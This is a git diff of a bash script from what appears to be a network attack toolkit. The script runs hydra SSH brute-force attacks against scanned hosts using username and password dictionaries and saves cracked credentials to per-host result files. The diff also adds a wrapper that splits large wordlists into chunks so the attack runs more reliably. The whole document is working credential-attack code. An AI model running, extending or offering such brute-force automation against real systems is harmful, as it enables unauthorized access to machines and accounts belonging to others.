@@ -116,6 +116,8 @@ done
 
 username=""
 password=""
+usernameoption=""
+passwordOption=""
 bool="0"
 clear
 echo -e "If you$red don't know$transparent the username press y/n"$transparent
@@ -154,7 +156,7 @@ if [ $ans == "n" ] || [ $ans == "y" ]; then
 	#sed -i "1i${hostnamesArray[i]}" "$username"
 	#bool="1"
 	##
-	username="-L "$username
+	usernameOption="-L "
 
 
 else
@@ -162,7 +164,7 @@ else
 	echo "please enter the username :"
 	read username
 	#add the name of the computer in the username dictionnary
-	username="-l "$username
+	usernameOption="-l "
 fi
 
 clear
@@ -200,21 +202,30 @@ if [ $ans == "n" ] || [ $ans == "y" ] ; then
 		fi
 	done
 	password=$PWD"/conf/dico/"${dicoArray[p]}
-	password="-P "$password
-
+	passwordOption="-P "
 else
 	clear
 	echo "please enter the password :"
 	read password
-	password="-p "$password
+	passwordOption="-p "
 fi
 
-echo $username
-echo $password
+echo $usernameOption $username
+echo $passwordOption $password
 
-echo "hydra ${addressArray[i]} ssh -V $username -P $password -e s -t 10"
-hydra ${addressArray[i]} ssh -vV $username $password -e s -t 4 -F -o "result/scanNetwork/pass_${hostnamesArray[i]}"
+#Like hydra generate false negative with dictionary  bigger than 90 words
+#I cut gradually the password dictionary.
+#This is actually the better to solve the problem ^^
+#it' important to cut gradually the dictionary to avoid saturating the memory.
 
+if [ $passwordOption = "-P" ]; then
+	user="$usernameOption $username"
+	./bruteforce/src/cutterBruteForce.sh ${addressArray[i]} $password $user "ssh"
+	tail -n 2 result/scanNetwork/tmp >> "result/scanNetwork/pass_${hostnamesArray[i]}"
+else
+	echo "hydra ${addressArray[i]} ssh -V $usernameOption $username $passwordOption $password -e s -t 10"
+	hydra ${addressArray[i]} ssh -vV $usernameOption $username $passwordOption $password -e s -F -o "result/scanNetwork/pass_${hostnamesArray[i]}"
+fi
 ##Uncomment this part to add by default the hostname in the user names dictionnary
 # Supress the line we hadded in the user dictionnary
 #if [ $bool = "1" ]; then
